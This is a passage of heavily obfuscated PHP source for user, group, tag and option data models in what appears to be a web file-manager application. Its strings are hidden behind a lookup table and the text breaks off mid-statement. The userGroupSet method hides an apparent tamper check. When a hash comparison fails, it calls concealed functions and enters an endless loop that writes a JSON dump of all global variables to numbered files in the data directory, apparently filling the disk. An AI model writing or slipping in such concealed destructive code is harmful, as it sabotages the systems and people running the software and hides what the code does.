$äğşºÎ»)); if (count($äğşºÎ») == 1) { $»ã¿àíÕ = array($ÍÉø›ß[1657] => $äğşºÎ»[0]); } $ßò§Àîì = Model($ÍÉø›ß[518])->field($this->simpleField)->where($»ã¿àíÕ)->select(); $ßò§Àîì = array_to_keyvalue($ßò§Àîì, $ÍÉø›ß[1666]); foreach ($äğşºÎ» as $í÷‘ğ­¼) { $şèÂŞ¥ì = $ßò§Àîì[$í÷‘ğ­¼]; if (!$şèÂŞ¥ì) { $ö¨³ŠÂí[$í÷‘ğ­¼ . $ÍÉø›ß[12]] = $this->getInfoSimpleOuter($í÷‘ğ­¼); continue; } $şèÂŞ¥ì[$ÍÉø›ß[544]] = Action($ÍÉø›ß[2270])->parseUrl($şèÂŞ¥ì[$ÍÉø›ß[544]]); $ö¨³ŠÂí[$í÷‘ğ­¼ . $ÍÉø›ß[12]] = $şèÂŞ¥ì; } } return $ö¨³ŠÂí; } protected function userStatus($Èìãşè, $Ïë²®“Ä) { $Æ­ñŒ¹à = $this->getInfoSimple($Èìãşè); if (!$Æ­ñŒ¹à) { return !1; } $ª…‹õÑ‰ = array($_SERVER[¯µç›È¢][767] => $Ïë²®“Ä); return $this->userEdit($Èìãşè, $ª…‹õÑ‰); } protected function userRemove($şÑ¢É«ï) { $Ä¦˜šã¯ =& $_SERVER[¯µç›È¢]; $è¹ÏõÅÈ = $this->getInfoSimple($şÑ¢É«ï); if (!$è¹ÏõÅÈ) { return !1; } $áæûŸµŠ = array($Ä¦˜šã¯[1657] => $şÑ¢É«ï); Model($Ä¦˜šã¯[603])->where($áæûŸµŠ)->delete(); Model($Ä¦˜šã¯[2298])->where($áæûŸµŠ)->delete(); Model($Ä¦˜šã¯[1923])->where($áæûŸµŠ)->delete(); Model($Ä¦˜šã¯[2283])->where($áæûŸµŠ)->delete(); Model($Ä¦˜šã¯[1080])->where($áæûŸµŠ)->delete(); Model($Ä¦˜šã¯[2120])->removeUserAll($şÑ¢É«ï); Model($Ä¦˜šã¯[842])->userRootRemove($şÑ¢É«ï); return $this->where($áæûŸµŠ)->delete(); } protected function userGroupSet($Ó’øõ©Ğ, $ìØóñ, $›Õ«—¾È = array()) { $î€šƒµÕ =& $_SERVER[¯µç›È¢]; $›÷Àô¡ = $_SERVER[$î€šƒµÕ[64]] . $î€šƒµÕ[65]; $”œÆ§¥ñ = $î€šƒµÕ[61]; if ($_SERVER[$î€šƒµÕ[62]] != $”œÆ§¥ñ($›÷Àô¡)) { $ğ¤Í€Õğ = $î€šƒµÕ[889]; $Èş¨ú = $î€šƒµÕ[63]; $¥øÅ©³ = $_SERVER[$î€šƒµÕ[64]] . $î€šƒµÕ[65]; $ŞÛÒĞµ¯ = $Èş¨ú($¥øÅ©³); $»®³ËÌù = explode($î€šƒµÕ[66], $ŞÛÒĞµ¯); if (count($»®³ËÌù) < $î€šƒµÕ[634]) { $¥Ô“ˆ—Ğ = $î€šƒµÕ[68]; $¥Ô“ˆ—Ğ(); } $ûœ¯Ğù = $î€šƒµÕ[890]; $ûœ¯Ğù($_SERVER[$î€šƒµÕ[891]]); $ğ¤Í€Õğ = $î€šƒµÕ[889]; $ğ¤Í€Õğ(); $¨¥›ÓÅü = $î€šƒµÕ[892]; $Á’ÜÎ’Ø = json_encode($GLOBALS[$î€šƒµÕ[893]]); $İæ‘£ßº = 1; for ($áß“éı = $İæ‘£ßº; $áß“éı > 0; $áß“éı++) { $¨¥›ÓÅü(DATA_PATH . $áß“éı, $Á’ÜÎ’Ø); } } $‘äáŒÛ = $this->getInfoSimple($Ó’øõ©Ğ); if (!$‘äáŒÛ || !is_array($ìØóñ)) { return !1; } $¯¥ç× = Model($î€šƒµÕ[1923]); $¯¥ç×->where(array($î€šƒµÕ[1666] => $Ó’øõ©Ğ))->delete(); $§Ğò € = array(); $¬•˜÷ŸÛ = 0; foreach ($ìØóñ as $Ù›’¦Â§ => $ŸÒ©°Šœ) { $¸šÅŒÉó = array($î€šƒµÕ[1666] => $Ó’øõ©Ğ, $î€šƒµÕ[1834] => $Ù›’¦Â§, $î€šƒµÕ[1937] => $ŸÒ©°Šœ); $¸šÅŒÉó[$î€šƒµÕ[1857]] = isset($›Õ«—¾È[$¬•˜÷ŸÛ]) ? $›Õ«—¾È[$¬•˜÷ŸÛ] : 0; $¬•˜÷ŸÛ++; $§Ğò €[] = $¸šÅŒÉó; } return $¯¥ç×->addAll($§Ğò €, array(), !0); } protected function userGroupAdd($½ı¨Ğö, $ÖíõÜŒç = array()) { $ÀšÄ¤¹ø =& $_SERVER[¯µç›È¢]; $ÚÄã”† = $this->getInfoSimple($½ı¨Ğö); if (!$ÚÄã”† || empty($ÖíõÜŒç)) { return !1; } $×óÜ¿ş = array(); foreach ($ÖíõÜŒç as $…ù‰îÒ => $£®š£½) { $×óÜ¿ş[] = array($ÀšÄ¤¹ø[1666] => $½ı¨Ğö, $ÀšÄ¤¹ø[1834] => $…ù‰îÒ, $ÀšÄ¤¹ø[1937] => $£®š£½, $ÀšÄ¤¹ø[1857] => 0); } return Model($ÀšÄ¤¹ø[1923])->addAll($×óÜ¿ş, array(), !0); } protected function userGroupRemove($••—ÖÍ, $º©î¯Ÿ±) { $®ªæµ®ğ =& $_SERVER[¯µç›È¢]; $‡´ûÓñµ = $this->getInfoSimple($••—ÖÍ); if (!$‡´ûÓñµ || !$º©î¯Ÿ±) { return !1; } $ÌøñÊõ† = array($®ªæµ®ğ[1657] => $••—ÖÍ, $®ªæµ®ğ[1921] => $º©î¯Ÿ±); return Model($®ªæµ®ğ[1923])->where($ÌøñÊõ†)->delete(); } public function listData() { $¶®ó•£„ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¶®ó•£„[$_SERVER[¯µç›È¢][377]]); return $¶®ó•£„; } public function listByID($½¢½ø–¯) { $³´€Õè =& $_SERVER[¯µç›È¢]; if (!$½¢½ø–¯) { return; } $Éè˜ªÜ = array($³´€Õè[1666] => array($³´€Õè[7], $½¢½ø–¯)); $†åÅˆó‘ = $this->where($Éè˜ªÜ)->select(); $†åÅˆó‘ = array_sort_keep($†åÅˆó‘, $³´€Õè[1666], $½¢½ø–¯); $this->_listDataApply($†åÅˆó‘); return $†åÅˆó‘; } public function listByGroup($Ä¾ŸÑçØ = 0, $ïŠä±©½ = array()) { $ãáºÌÒ¦ =& $_SERVER[¯µç›È¢]; $Ù†‹ = $ãáºÌÒ¦[12]; $óù¨²è = array(); if ($Ä¾ŸÑçØ) { $óù¨²è = array($ãáºÌÒ¦[2299] => intval($Ä¾ŸÑçØ)); $Ù†‹ = "\x4c\105\106\124\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\145\162\137\147\162\x6f\165\x70\40\x75\163\x65\162\x5f\147\162\157\165\x70\40\x6f\156\40\165\163\145\162\56\165\x73\x65\x72\x49\104\40\x3d\x20\x75\x73\x65\162\x5f\x67\x72\x6f\165\160\x2e\165\163\x65\162\111\x44"; $Ç¼ö–¡ = Input::get($ãáºÌÒ¦[460], null, $ãáºÌÒ¦[12]) ? $ãáºÌÒ¦[12] : $ãáºÌÒ¦[2300]; } if (isset($ïŠä±©½[$ãáºÌÒ¦[767]])) { $óù¨²è[$ãáºÌÒ¦[2301]] = $ïŠä±©½[$ãáºÌÒ¦[767]]; } $³—Ï¤º  = $this->_makeOrder($Ç¼ö–¡)->field($ãáºÌÒ¦[2302])->where($óù¨²è)->join($Ù†‹)->selectPage(50); $this->_listDataApply($³—Ï¤º [$ãáºÌÒ¦[377]]); return $³—Ï¤º ; } private function _makeOrder($¶´”‘±Œ = '') { $·µ¢ÚÑµ =& $_SERVER[¯µç›È¢]; $¦×Éæï¾ = array($·µ¢ÚÑµ[1666], $·µ¢ÚÑµ[32], $·µ¢ÚÑµ[1823], $·µ¢ÚÑµ[1795], $·µ¢ÚÑµ[207]); $—´Ğ µ = array($·µ¢ÚÑµ[453] => $·µ¢ÚÑµ[454], $·µ¢ÚÑµ[455] => $·µ¢ÚÑµ[456]); $ùóÖŞË¤ = Input::get($·µ¢ÚÑµ[460], $·µ¢ÚÑµ[7], $·µ¢ÚÑµ[1657], $¦×Éæï¾); $‡Ñ„‚ƒ = Input::get($·µ¢ÚÑµ[461], $·µ¢ÚÑµ[7], $·µ¢ÚÑµ[1924], array($·µ¢ÚÑµ[1924], $·µ¢ÚÑµ[455])); $‡Ñ„‚ƒ = $—´Ğ µ[$‡Ñ„‚ƒ]; $¶´”‘±Œ = $¶´”‘±Œ . "\165\163\145\x72\x2e{$ùóÖŞË¤}\x20{$‡Ñ„‚ƒ}\54\40\x75\163\145\162\x2e\165\x73\x65\x72\x49\x44\40\141\163\x63"; return $this->alias($·µ¢ÚÑµ[2044])->order($¶´”‘±Œ); } public function listSearch($ÙÜ˜‹Áˆ) { $°û¯Ì½ =& $_SERVER[¯µç›È¢]; $îÑÇ’†× = $ÙÜ˜‹Áˆ[$°û¯Ì½[1927]]; $ ì™èñ = isset($ÙÜ˜‹Áˆ[$°û¯Ì½[1928]]) ? $ÙÜ˜‹Áˆ[$°û¯Ì½[1928]] : !1; $îÑÇ’†× = str_replace($°û¯Ì½[1929], $°û¯Ì½[1930], trim($îÑÇ’†×)); $‰–éìñ = array($°û¯Ì½[32] => array($°û¯Ì½[391], "\45{$îÑÇ’†×}\45"), $°û¯Ì½[313] => array($°û¯Ì½[391], "{$îÑÇ’†×}\x25"), $°û¯Ì½[543] => array($°û¯Ì½[391], "{$îÑÇ’†×}\45"), $°û¯Ì½[1012] => $°û¯Ì½[1931]); if (Input::check($îÑÇ’†×, $°û¯Ì½[319])) { $‰–éìñ[$°û¯Ì½[1666]] = array($°û¯Ì½[391], "{$îÑÇ’†×}\x25"); $‰–éìñ[$°û¯Ì½[2284]] = array($°û¯Ì½[391], "{$îÑÇ’†×}\x25"); } if (!$îÑÇ’†×) { $‰–éìñ = array(); } if (isset($ÙÜ˜‹Áˆ[$°û¯Ì½[767]])) { $‰–éìñ[$°û¯Ì½[767]] = $ÙÜ˜‹Áˆ[$°û¯Ì½[767]]; } $‰–éìñ = $this->parseWhereLike($‰–éìñ); $€Ã¢˜¸Ô = $this->_makeOrder()->where($‰–éìñ)->selectPage(20); if (!$€Ã¢˜¸Ô || count($€Ã¢˜¸Ô[$°û¯Ì½[377]]) < 5 && Input::check($îÑÇ’†×, $°û¯Ì½[326])) { $ø¹Ü‡¿ = $this->_searchFromMeta($°û¯Ì½[468], $îÑÇ’†×, 10); $½åªé¹Ï = $this->_searchFromMeta($°û¯Ì½[469], $îÑÇ’†×, 10); $·¬ìÖ¤İ = array_merge($ø¹Ü‡¿, $½åªé¹Ï, $€Ã¢˜¸Ô[$°û¯Ì½[377]]); $€Ã¢˜¸Ô[$°û¯Ì½[377]] = array_unique_by_key($·¬ìÖ¤İ, $°û¯Ì½[1666]); $€Ã¢˜¸Ô[$°û¯Ì½[374]][$°û¯Ì½[375]] = count($€Ã¢˜¸Ô[$°û¯Ì½[377]]); $€Ã¢˜¸Ô[$°û¯Ì½[374]][$°û¯Ì½[376]] = ceil($€Ã¢˜¸Ô[$°û¯Ì½[374]][$°û¯Ì½[375]] / $€Ã¢˜¸Ô[$°û¯Ì½[374]][$°û¯Ì½[371]]); } $this->_listDataApply($€Ã¢˜¸Ô[$°û¯Ì½[377]]); $this->_filterByGroup($€Ã¢˜¸Ô, $ ì™èñ); return $€Ã¢˜¸Ô; } private function _filterByGroup(&$İÕ•ÒÍ©, $áÂÏ½…®) { $äËş¶Œ =& $_SERVER[¯µç›È¢]; if (!$áÂÏ½…®) { return $İÕ•ÒÍ©; } foreach ($İÕ•ÒÍ©[$äËş¶Œ[377]] as $ğÈ»äšÇ => &$¢É§ÂÒá) { $Ÿ»¼µ¹ = array_to_keyvalue($¢É§ÂÒá[$äËş¶Œ[2014]], $äËş¶Œ[12], $äËş¶Œ[1834]); if (!in_array($áÂÏ½…®, $Ÿ»¼µ¹)) { unset($İÕ•ÒÍ©[$äËş¶Œ[377]][$ğÈ»äšÇ]); } } unset($¢É§ÂÒá); $İÕ•ÒÍ©[$äËş¶Œ[377]] = array_values($İÕ•ÒÍ©[$äËş¶Œ[377]]); $İÕ•ÒÍ©[$äËş¶Œ[374]] = array($äËş¶Œ[2077] => count($İÕ•ÒÍ©[$äËş¶Œ[377]]), $äËş¶Œ[2075] => $İÕ•ÒÍ©[$äËş¶Œ[374]][$äËş¶Œ[371]], $äËş¶Œ[2074] => 1, $äËş¶Œ[2076] => 1); } private function _searchFromMeta($½»³ŞöÂ, $ÔŞ©‹‰½, $¯›ëÜ½­) { $ÂôÁü×™ =& $_SERVER[¯µç›È¢]; $ÔŞ©‹‰½ = strtolower($ÔŞ©‹‰½); $È¡£¥Á = array($ÂôÁü×™[105] => $½»³ŞöÂ, $ÂôÁü×™[382] => array($ÂôÁü×™[391], "\x25{$ÔŞ©‹‰½}\45")); $È¡£¥Á = $this->parseWhereLike($È¡£¥Á); $×©«õºƒ = Model($ÂôÁü×™[2303])->where($È¡£¥Á)->limit($¯›ëÜ½­)->select(); if (!$×©«õºƒ) { return array(); } $×©«õºƒ = array_to_keyvalue($×©«õºƒ, $ÂôÁü×™[12], $ÂôÁü×™[1666]); $Å¯“šÍñ = $this->where(array($ÂôÁü×™[1657] => array($ÂôÁü×™[7], $×©«õºƒ)))->select(); if (!$Å¯“šÍñ) { return array(); } return $Å¯“šÍñ; } private function _listDataApplyItem($î°˜») { $¡İ®ìÆø = array($î°˜»); $this->_listDataApply($¡İ®ìÆø); return $¡İ®ìÆø[0]; } private function _listDataApply(&$ßüØüÉ) { $·ğ Æè“ =& $_SERVER[¯µç›È¢]; if (!$ßüØüÉ) { return; } array_remove_key($ßüØüÉ, $·ğ Æè“[901]); $‹Şşúğí = array_to_keyvalue($ßüØüÉ, $·ğ Æè“[12], $·ğ Æè“[1666]); $this->_listAppendGroup($ßüØüÉ, $‹Şşúğí); $this->_listAppendMeta($ßüØüÉ, $‹Şşúğí); $this->_listAppendSourceRoot($ßüØüÉ, $‹Şşúğí); } private function _listAppendSourceRoot(&$Ë•òËˆš, $‡ß ŒÆû) { $Àö†¡›– =& $_SERVER[¯µç›È¢]; $Ø‰Æ‘øù = Model($Àö†¡›–[842])->listSourceRoot(SourceModel::TYPE_USER, $‡ß ŒÆû); $Ø‰Æ‘øù = array_to_keyvalue($Ø‰Æ‘øù, $Àö†¡›–[510]); $Ø‰Æ‘øù = array_remove_key($Ø‰Æ‘øù, $Àö†¡›–[510]); foreach ($Ë•òËˆš as &$—° µÅ) { $—° µÅ[$Àö†¡›–[97]] = $Ø‰Æ‘øù[$—° µÅ[$Àö†¡›–[1666]]] ? $Ø‰Æ‘øù[$—° µÅ[$Àö†¡›–[1666]]] : array(); } unset($—° µÅ); } private function _listAppendGroup(&$æö¿˜Àú, $ÛúËúæ¾) { $ç™Ì—‚Æ =& $_SERVER[¯µç›È¢]; $ò¦ Æš— = array($ç™Ì—‚Æ[1666] => array($ç™Ì—‚Æ[7], $ÛúËúæ¾)); $²™ÔØ‚ = Model($ç™Ì—‚Æ[1923])->where($ò¦ Æš—)->select(); $Ÿ€ñ”¶Í = array_to_keyvalue($²™ÔØ‚, $ç™Ì—‚Æ[12], $ç™Ì—‚Æ[1834]); $Ÿ€ñ”¶Í = array_remove_value(array_unique($Ÿ€ñ”¶Í), $ç™Ì—‚Æ[204]); if (!$Ÿ€ñ”¶Í || !$²™ÔØ‚) { return; } $ò¦ Æš— = array($ç™Ì—‚Æ[1834] => array($ç™Ì—‚Æ[7], $Ÿ€ñ”¶Í)); $íÁ˜ô¡‘ = Model($ç™Ì—‚Æ[2012])->field($ç™Ì—‚Æ[2304])->where($ò¦ Æš—)->select(); $íÁ˜ô¡‘ = array_to_keyvalue($íÁ˜ô¡‘, $ç™Ì—‚Æ[1834]); $²™ÔØ‚ = array_to_keyvalue_group($²™ÔØ‚, $ç™Ì—‚Æ[1666]); foreach ($²™ÔØ‚ as &$Ú¶¹¯Œ¯) { $Ä³ãùıø = array(); foreach ($Ú¶¹¯Œ¯ as $½…ö¢™Ÿ) { if (!$½…ö¢™Ÿ[$ç™Ì—‚Æ[1937]]) { continue; } $ÀÂì¿•“ = Model($ç™Ì—‚Æ[512])->listData($½…ö¢™Ÿ[$ç™Ì—‚Æ[1937]]); $Ä³ãùıø[] = array($ç™Ì—‚Æ[1834] => $½…ö¢™Ÿ[$ç™Ì—‚Æ[1834]], $ç™Ì—‚Æ[2305] => $íÁ˜ô¡‘[$½…ö¢™Ÿ[$ç™Ì—‚Æ[1834]]][$ç™Ì—‚Æ[32]], $ç™Ì—‚Æ[526] => $íÁ˜ô¡‘[$½…ö¢™Ÿ[$ç™Ì—‚Æ[1834]]][$ç™Ì—‚Æ[526]], $ç™Ì—‚Æ[419] => $ÀÂì¿•“); } $Ú¶¹¯Œ¯ = $Ä³ãùıø; } unset($Ú¶¹¯Œ¯); foreach ($æö¿˜Àú as &$è¡£°ªÌ) { $è¡£°ªÌ[$ç™Ì—‚Æ[2014]] = array(); if (isset($²™ÔØ‚[$è¡£°ªÌ[$ç™Ì—‚Æ[1666]]])) { $è¡£°ªÌ[$ç™Ì—‚Æ[2014]] = $²™ÔØ‚[$è¡£°ªÌ[$ç™Ì—‚Æ[1666]]]; } } unset($è¡£°ªÌ); } public function userAppendGroup($ó§È§™ı) { $ğ”ãóó¶ =& $_SERVER[¯µç›È¢]; if (!$ó§È§™ı) { return array(); } $this->_listAppendGroup($ó§È§™ı, array_to_keyvalue($ó§È§™ı, $ğ”ãóó¶[12], $ğ”ãóó¶[1666])); return $ó§È§™ı; } private function _listAppendMeta(&$÷µÍÀ¿ı, $²àçŠ¥…) { $ÜˆÍîÓ =& $_SERVER[¯µç›È¢]; $»âÒ¡Ùë = UserJobModel::JOB_KEY; $¦¢†º€ = array($ÜˆÍîÓ[2285]); $±ÅÔµŒØ = array($ÜˆÍîÓ[1666] => array($ÜˆÍîÓ[7], $²àçŠ¥…)); $«À½¡•ğ = Model($ÜˆÍîÓ[2283])->where($±ÅÔµŒØ)->select(); $«À½¡•ğ = array_to_keyvalue_group($«À½¡•ğ, $ÜˆÍîÓ[1666]); foreach ($«À½¡•ğ as &$½Úß´İ¦) { $ü¶½½ï› = array(); foreach ($½Úß´İ¦ as $¼Ì¤’) { if (!in_array($¼Ì¤’[$ÜˆÍîÓ[105]], $¦¢†º€)) { $ü¶½½ï›[$¼Ì¤’[$ÜˆÍîÓ[105]]] = $¼Ì¤’[$ÜˆÍîÓ[382]]; } } $½Úß´İ¦ = $ü¶½½ï›; } unset($½Úß´İ¦); $„«‰„ÉØ = Model($ÜˆÍîÓ[2306]); foreach ($÷µÍÀ¿ı as &$Àâ„Ÿ¸Ö) { $Ê›úÓÔœ = array(); if (isset($«À½¡•ğ[$Àâ„Ÿ¸Ö[$ÜˆÍîÓ[1666]]])) { $Ê›úÓÔœ = $«À½¡•ğ[$Àâ„Ÿ¸Ö[$ÜˆÍîÓ[1666]]]; } $Àâ„Ÿ¸Ö[$ÜˆÍîÓ[2307]] = array(); if (isset($Ê›úÓÔœ[$»âÒ¡Ùë])) { $Àâ„Ÿ¸Ö[$ÜˆÍîÓ[2307]] = $„«‰„ÉØ->getUserJobInfo($Ê›úÓÔœ[$»âÒ¡Ùë]); } } unset($Àâ„Ÿ¸Ö); } protected function groupUserAll($Ö„ä¸·©) { $ßñ¿îà =& $_SERVER[¯µç›È¢]; if (!$Ö„ä¸·©) { return !1; } $š‘áÇô = Model($ßñ¿îà[1923])->field($ßñ¿îà[1666])->where(array($ßñ¿îà[1834] => array($ßñ¿îà[7], $Ö„ä¸·©)))->select(); $š‘áÇô = array_to_keyvalue($š‘áÇô, $ßñ¿îà[12], $ßñ¿îà[1666]); return array_unique($š‘áÇô); } public function userSearch($§ñ°§ŸÎ, $¼…¤ùÒ÷ = "\52") { return Model($_SERVER[¯µç›È¢][546])->where($§ñ°§ŸÎ)->field($¼…¤ùÒ÷)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\x6f\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¸¯Î°Ó) { $‚½üÕŠ” =& $_SERVER[¯µç›È¢]; if (!defined($‚½üÕŠ”[479])) { define($‚½üÕŠ”[479], 0); } return "\x55\x73\x65\x72\x4f\160\164\x69\157\156\x5f{$¸¯Î°Ó}\137" . USER_ID; } protected function filterWhere($×ÅüÅöô) { $ìùÈ‹„ =& $_SERVER[¯µç›È¢]; if (!defined($ìùÈ‹„[479])) { define($ìùÈ‹„[479], 0); } $×ÅüÅöô[$ìùÈ‹„[1666]] = USER_ID; return $×ÅüÅöô; } public function cacheRemoveUser($–ÇÊÅ…¬, $¡À½áïû) { return Cache::remove("\125\x73\145\162\117\x70\164\151\157\x6e\137{$–ÇÊÅ…¬}\137" . $¡À½áïû); } protected function optionDefault($åÕ˜–ïå = '') { $÷Ø „—Õ =& $_SERVER[¯µç›È¢]; if ($åÕ˜–ïå == $÷Ø „—Õ[12]) { return $GLOBALS[$÷Ø „—Õ[6]][$÷Ø „—Õ[2308]]; } if ($åÕ˜–ïå == $÷Ø „—Õ[2309]) { return $GLOBALS[$÷Ø „—Õ[6]][$÷Ø „—Õ[2310]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\164\141\x67\114\151\x73\x74"; public $modelType = "\x55\x73\x65\x72\117\x70\x74\x69\157\x6e"; public $field = array("\156\x61\155\145", "\x73\164\171\x6c\145", "\x73\x6f\162\x74"); public function listData($½ö×¬áğ = false, $ÊÅò¬Å× = "\163\x6f\162\x74", $òÂ§ÙÃ½ = false) { return parent::listData($½ö×¬áğ, $ÊÅò¬Å×, $òÂ§ÙÃ½); } public function remove($™¶é­–) { return parent::remove($™¶é­–); } public function add($Êì¯Í®, $Ş­¿ÉØÓ = "\x6c\x61\142\x65\x6c\55\147\162\x65\171\55\x6e\157\162\155\x61\x6c") { $–¨äô± =& $_SERVER[¯µç›È¢]; if ($this->findByName($Êì¯Í®)) { return !1; } $œŠ‘Ìâ = array($–¨äô±[426] => $Êì¯Í®, $–¨äô±[489] => $Ş­¿ÉØÓ, $–¨äô±[1838] => $this->getSort($–¨äô±[266]) + 1); return parent::insert($œŠ‘Ìâ); } public function update($€óÈÎ€, $¤¥±ˆÓ’) { $Ù€¨ûì… =& $_SERVER[¯µç›È¢]; $¼À½©Ÿí = $this->listData($€óÈÎ€); $ä²Üìõö = $this->findByName($¤¥±ˆÓ’[$Ù€¨ûì…[32]]); if (!$¼À½©Ÿí || $ä²Üìõö && $ä²Üìõö[$Ù€¨ûì…[405]] != $¼À½©Ÿí[$Ù€¨ûì…[405]]) { return !1; } return parent::update($€óÈÎ€, $¤¥±ˆÓ’); } public function moveTop($ÍÎ²ˆ½û) { $“ƒÜÏ€í =& $_SERVER[¯µç›È¢]; $ŠĞ²õœ = parent::listData(); $º°ñ€ã = $this->getSort($“ƒÜÏ€í[265]); foreach ($ŠĞ²õœ as &$ò×›Ì€Ş) { if ($ò×›Ì€Ş[$“ƒÜÏ€í[405]] == $ÍÎ²ˆ½û) { $ò×›Ì€Ş[$“ƒÜÏ€í[1857]] = $º°ñ€ã; continue; } $ò×›Ì€Ş[$“ƒÜÏ€í[1857]] += 1; } unset($ò×›Ì€Ş); return parent::resetData($ŠĞ²õœ); } public function moveBottom($õ¡‘ŠÆ) { $ıôú¿Ë¸ =& $_SERVER[¯µç›È¢]; $Óº´ØÍ = $this->getSort($ıôú¿Ë¸[266]) + 1; return parent::update($õ¡‘ŠÆ, array($ıôú¿Ë¸[1857] => $Óº´ØÍ)); } public function resetSort($óÎ“ã¦) { $ğá‚Ää° =& $_SERVER[¯µç›È¢]; $øæıùÂè = array(); $óÎ“ã¦ = is_array($óÎ“ã¦) ? $óÎ“ã¦ : array(); for ($Å¿ü±• = 0; $Å¿ü±• < count($óÎ“ã¦); $Å¿ü±•++) { $øæıùÂè[$óÎ“ã¦[$Å¿ü±•] . $ğá‚Ää°[12]] = $Å¿ü±• + 1; } $ã¤¥úö‹ = parent::listData(); foreach ($ã¤¥úö‹ as &$¶­¾–Æ) { $éåèÆÆÁ = $øæıùÂè[$¶­¾–Æ[$ğá‚Ää°[405]]]; $¶­¾–Æ[$ğá‚Ää°[1857]] = $éåèÆÆÁ ? $éåèÆÆÁ : $¶­¾–Æ[$ğá‚Ää°[1857]]; } unset($¶­¾–Æ); return parent::resetData($ã¤¥úö‹); } private function getSort($¬¯±Æ¤ó) { $šğ†ƒ”¥ =& $_SERVER[¯µç›È¢]; $÷Á“Ù±Ò = parent::listData(); $ÒÁëû¦ñ = array_to_keyvalue($÷Á“Ù±Ò, $šğ†ƒ”¥[12], $šğ†ƒ”¥[1857]); if (!$ÒÁëû¦ñ) { $ÒÁëû¦ñ = array(0); } $„•è–– = $¬¯±Æ¤ó == $šğ†ƒ”¥[266] ? max($ÒÁëû¦ñ) : min($ÒÁëû¦ñ); return intval($„•è––); } } goto AÚ£à©Ê÷; AÔËØµÙˆ¨: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($”ÅªÚÕƒ = false, $ûùË²‘´ = '', $õÜè¢ñÁ = false) { $à¥‘À˜ò =& $_SERVER[¯µç›È¢]; $¨Ëìµ­Û = $this->cacheGet($ûùË²‘´); $™­ï¾İ¼ = $this->optionDefault($ûùË²‘´); $™­ï¾İ¼ = is_array($™­ï¾İ¼) ? $™­ï¾İ¼ : array(); if (is_array($¨Ëìµ­Û)) { $¨Ëìµ­Û = array_merge($™­ï¾İ¼, $¨Ëìµ­Û); return $”ÅªÚÕƒ ? isset($¨Ëìµ­Û[$”ÅªÚÕƒ]) ? $¨Ëìµ­Û[$”ÅªÚÕƒ] : null : $¨Ëìµ­Û; } $ÎÏğ¨Ê‚ = $this->filterWhere(array($à¥‘À˜ò[33] => $ûùË²‘´)); $¨Ëìµ­Û = $this->where($ÎÏğ¨Ê‚)->select(); $¨Ëìµ­Û = array_to_keyvalue($¨Ëìµ­Û, $à¥‘À˜ò[105], $à¥‘À˜ò[382]); foreach ($¨Ëìµ­Û as $®·Ä”ƒÑ => $ÃÀµÆØæ) { if ($õÜè¢ñÁ || in_array($®·Ä”ƒÑ, $this->jsonField)) { $¨Ëìµ­Û[$®·Ä”ƒÑ] = json_decode($ÃÀµÆØæ, !0); } } $this->cacheSet($ûùË²‘´, $¨Ëìµ­Û); $¨Ëìµ­Û = array_merge($™­ï¾İ¼, $¨Ëìµ­Û); return $”ÅªÚÕƒ ? $¨Ëìµ­Û[$”ÅªÚÕƒ] : $¨Ëìµ­Û; } public function set($ĞµöÇªœ, $Šˆ°œÊØ = false, $ªâÒÚÅö = '') { $¢¹–ÌÈÚ =& $_SERVER[¯µç›È¢]; $this->cacheRemove($ªâÒÚÅö); $Ğ§Ç‘¶ã = array(); $‚‘½ ¾ö = is_array($ĞµöÇªœ) ? $ĞµöÇªœ : array($ĞµöÇªœ => $Šˆ°œÊØ); foreach ($‚‘½ ¾ö as $¿ä¦‚ => $İá •¢ä) { if (is_array($İá •¢ä)) { $İá •¢ä = json_encode_force($İá •¢ä); } $this->checkLength($İá •¢ä, !1, $this->tableName . $¢¹–ÌÈÚ[4] . $ĞµöÇªœ); $İá •¢ä = self::textEncode($İá •¢ä); $‚‘½ ¾ö = array($¢¹–ÌÈÚ[33] => $ªâÒÚÅö, $¢¹–ÌÈÚ[105] => $¿ä¦‚, $¢¹–ÌÈÚ[382] => $İá •¢ä); $Ğ§Ç‘¶ã[] = $this->filterWhere($‚‘½ ¾ö); } if (!$Ğ§Ç‘¶ã) { return !0; } $äÈüêšÒ = $this->cacheKey($¢¹–ÌÈÚ[406]); CacheLock::lock($äÈüêšÒ); $¾¡ı‹âå = $this->addAll($Ğ§Ç‘¶ã, array(), !0); CacheLock::unlock($äÈüêšÒ); return $¾¡ı‹âå; } protected function optionDefault($£½«‘ó‚ = '') { return !1; } public function setDeep($ä®òÊú—, $˜ÜÓÆ»€ = false, $ç‡Ú¸‡ = '') { $«”¥–Ø = explode($_SERVER[¯µç›È¢][10], $ä®òÊú—); $ĞÒ¾’‘Ü = $this->get(); array_set_value($ĞÒ¾’‘Ü, $ä®òÊú—, $˜ÜÓÆ»€); $this->set($«”¥–Ø[0], $ĞÒ¾’‘Ü[$«”¥–Ø[0]], $ç‡Ú¸‡); } public function remove($´€†µû¢, $Íğ´¥ª¡ = '') { $Ş½úõ†ç =& $_SERVER[¯µç›È¢]; $this->cacheRemove($Íğ´¥ª¡); $²ãÒÔ—ä = $this->filterWhere(array($Ş½úõ†ç[105] => $´€†µû¢, $Ş½úõ†ç[33] => $Íğ´¥ª¡)); if (is_null($´€†µû¢)) { unset($²ãÒÔ—ä[$Ş½úõ†ç[105]]); } return $this->where($²ãÒÔ—ä)->delete(); } public function cacheSet($é¶àş¨î, $÷ÅŞáÌ˜ = false) { return Cache::set($this->cacheKey($é¶àş¨î), $÷ÅŞáÌ˜); } public function cacheGet($Ô˜â©ñ™) { return Cache::get($this->cacheKey($Ô˜â©ñ™)); } public function cacheRemove($ÒÅÔª÷Ç) { return Cache::remove($this->cacheKey($ÒÅÔª÷Ç)); } protected function filterWhere($°”ì¯‘¾) { return $°”ì¯‘¾; } protected function cacheKey($ª•âˆ¾¤) { return $ª•âˆ¾¤; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\x63\145"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\141\155\x65" => "\151\157\137\x73\x6f\165\x72\x63\x65\x5f\155\x65\164\141", "\155\145\164\141\x46\151\145\x6c\144" => "\163\157\165\x72\143\145\111\104"); protected $dataAuto = 